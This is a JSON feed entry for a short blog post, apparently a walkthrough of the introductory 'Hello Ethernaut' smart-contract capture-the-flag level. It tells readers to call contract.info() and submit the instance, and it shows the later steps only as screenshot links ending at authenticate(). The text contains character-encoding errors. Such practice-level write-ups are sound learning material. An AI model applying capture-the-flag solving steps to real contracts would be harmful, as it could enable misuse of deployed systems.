            "content_text": "Look into the level‚Äôs info method contract.info()  or¬†await contract.info()¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.after transaction called, clik the ‚ÄúSubmit Instance‚Äù button",
            "content_html": "<p>Look into the level‚Äôs info method <code class=\"language-plaintext highlighter-rouge\">contract.info()</code>  or¬†<code class=\"language-plaintext highlighter-rouge\">await contract.info()</code>¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info().png\" alt=\"Image await contract.info()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info1().png\" alt=\"Image await contract.info1()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info2().png\" alt=\"Image await contract.info2()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_infoNum().png\" alt=\"Image await contract.infoNum()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info42().png\" alt=\"Image await contract.info42()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_theMethodName().png\" alt=\"Image await contract.theMethodName()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_method7123949().png\" alt=\"Image await contract.method7123949()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_authenticate().png\" alt=\"Image await contract.authenticate()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/mm.png\" alt=\"Image Metamask\" /></p><p>after transaction called, clik the ‚ÄúSubmit Instance‚Äù button</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            
            
            
            "tags": ["blockchain","ethernaut"],
            
            "date_published": "2025-04-16T00:00:00+09:00",
            "date_modified": "2025-04-16T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}